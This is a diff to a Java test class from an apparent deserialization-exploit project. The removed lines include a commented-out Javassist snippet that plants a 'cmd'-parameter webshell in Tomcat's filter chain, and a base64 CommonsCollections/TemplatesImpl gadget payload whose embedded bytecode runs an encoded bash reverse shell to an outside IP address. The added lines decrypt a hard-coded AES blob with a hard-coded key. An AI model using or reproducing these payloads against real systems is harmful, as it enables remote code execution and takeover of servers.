@@ -24,6 +24,8 @@ import org.apache.commons.collections4.map.LazyMap;
 import org.apache.shiro.crypto.AesCipherService;
 import org.apache.shiro.util.ByteSource;
 
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
 import javax.management.BadAttributeValueExpException;
 import javax.script.ScriptEngine;
 import javax.script.ScriptEngineManager;
@@ -45,37 +47,23 @@ import org.hibernate.transform.Transformers;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 import org.springframework.security.core.parameters.P;
 
-public class Test {
-    public static void main(String[] args) throws Exception {
-        try{
-//            ClassPool.getDefault().insertClassPath("/Users/y1shin/.m2/repository/org/apache/tomcat/embed/tomcat-embed-core/9.0.65/tomcat-embed-core-9.0.65.jar");
-//            CtClass c2 = ClassPool.getDefault().getCtClass("org.apache.catalina.core.ApplicationFilterChain");
-//            CtMethod method = c2.getDeclaredMethod("doFilter");
-//            System.out.println(method.getName());
-//
-//            Runtime.getRuntime().exec("calc");
-//            String body =
-//
-//                    "javax.servlet.http.HttpServletRequest request = $1\n;" +
-//
-//                            "String cmd=request.getParameter(\"cmd\");\n" +
-//
-//                            "if (cmd != null){\n" +
-//
-//                            "  java.lang.Runtime.getRuntime().exec(cmd);\n" +
-//
-//                            "  } else {java.lang.Runtime.getRuntime().exec(\"calc\");};";
-//            method.insertBefore(body);
-////            ctMethod.setBody(body);
-//            c2.writeFile();
-            String payload = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAABBnK/rq+AAAANABCAQBZb3JnL2FwYWNoZS9jb21tb21zL2JlYW51dGlscy9jb3lvdGUvc2VyL3N0ZC9SYXdTZXJpYWxpemVyMTZhZWQ5OTFmNzliNDI1M2IxNTdjM2Q5MzUyZWEzY2IHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQAEYmFzZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA3NlcAEAA2NtZAEABjxpbml0PgEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HAAsMAAkACgoABAANAQAHb3MubmFtZQgADwEAEGphdmEvbGFuZy9TeXN0ZW0HABEBAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DAATABQKABIAFQEAEGphdmEvbGFuZy9TdHJpbmcHABcBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DAAZABoKABgAGwEAA3dpbggAHQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDAAfACAKABgAIQEAB2NtZC5leGUIACMMAAUABgkAAgAlAQACL2MIACcMAAcABgkAAgApAQAHL2Jpbi9zaAgAKwEAAi1jCAAtDAAIAAYJAAIALwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgcAMQEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYMAAkAMwoAMgA0AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsMADYANwoAMgA4AQAQamF2YS9sYW5nL09iamVjdAcAOgEACDxjbGluaXQ+AQBVe2VjaG8sYzJnZ0xXa2dQaVlnTDJSbGRpOTBZM0F2TkRjdU1UQTVMakkzTGpJd01TODVNRGs1SURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQgAPQoAAgANAQAEQ29kZQEADVN0YWNrTWFwVGFibGUAIQACAAQAAAADAAkABQAGAAAACQAHAAYAAAAJAAgABgAAAAIAAQAJAAoAAQBAAAAAhAAEAAIAAABTKrcADhIQuAAWtgAcEh62ACKZABASJLMAJhIoswAqpwANEiyzACYSLrMAKga9ABhZA7IAJlNZBLIAKlNZBbIAMFNMuwAyWSu3ADW2ADlXpwAETLEAAQAEAE4AUQAMAAEAQQAAABcABP8AIQABBwACAAAJZQcADPwAAAcAOwAIADwACgABAEAAAAAaAAIAAAAAAA4SPrMAMLsAAlm3AD9XsQAAAAAAAHB0ACQ1ODRkOGIzYi02NDVjLTQzZDEtOWE2Yi0yMGI5NzQwYWMxMjVwdwEAeHNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1lcQB+AAlbAAtpUGFyYW1UeXBlc3EAfgAIeHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAATZ2V0T3V0cHV0UHJvcGVydGllc3VyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh4";
-            Utils.unserializeFromBase64(payload);
+import static sun.security.x509.CertificateAlgorithmId.ALGORITHM;
 
-        } catch (Exception e) {
-            throw new RuntimeException(e);
-        }
+public class Test {
+    private static final String KEY = "oszXCfTeXHpIkMS3";
+    private static final String ALGORITHM = "AES";
+    public static void main(String[] args) throws Exception {
+        System.out.println(decrypt("SpL+x7y+I+ZMyWEXeJ0NZMa2lXxVJJQX8qje+iiGLCag8tPabyOaifukFtoSxu6RFUpZaKyNuMCXHzK3RDjcTFL73lNoG0uHqJJBjObbdTPDfU7cYGyAY5cXrNzHkdq6IyH1gpeYpyzuLqXSSjhkwp1pKh6Uh6asrqyZuM97bG3Vakj6n1FXkVyDfSWHkDhIns9VKOKE5dgs4ZwhBUxRI67sQmSA2+47jDr/nLzxsa1DIv9K67DBh8hrgV2XrBsGbbCsaiZo45Qxy62KbNjXeNpMjnAF/05JhkOqFkaqh97yhOgERj/cx+y5sYC3GTSBK5UW7o8ozXn3OjZt1b6OFnX13uDI8Pnvajsw1EaY/KaDNCUS6ATLbajdQsza7Rmt1MODH7j5EW49s+1dKHdrWGv27YLnRMqQptBCn56yoiLZ21aJ/CggSZnRqdee7pChC23JnN+E3t2tKQG8QQnxT6XXsTmii0kRCEoXFiEVrmJpg+7wo1Mqpj9T32i6wlmP+bdJWcOxjizJOoSkd0RAVf8dU399C2TkViAaOhLAj2XCW+qF8z6Dbs/G1HIs51QGig0ujdQFkZ+j6wo2F5B0OBh0oMLT4q2A9DuU5XEC00M="));
     }
 
+    public static String decrypt(String strToDecrypt) throws Exception {
+        SecretKeySpec secretKey = new SecretKeySpec(KEY.getBytes(), ALGORITHM);
+        Cipher cipher = Cipher.getInstance(ALGORITHM);
+        cipher.init(Cipher.DECRYPT_MODE, secretKey);
+        byte[] decodedValue = Base64.getDecoder().decode(strToDecrypt);
+        byte[] decryptedByteValue = cipher.doFinal(decodedValue);
+        return Base64.getEncoder().encodeToString(decryptedByteValue);
+    }
     public static void serialize(Object object ,String filename) throws IOException {
         ByteArrayOutputStream barr = new ByteArrayOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(barr);
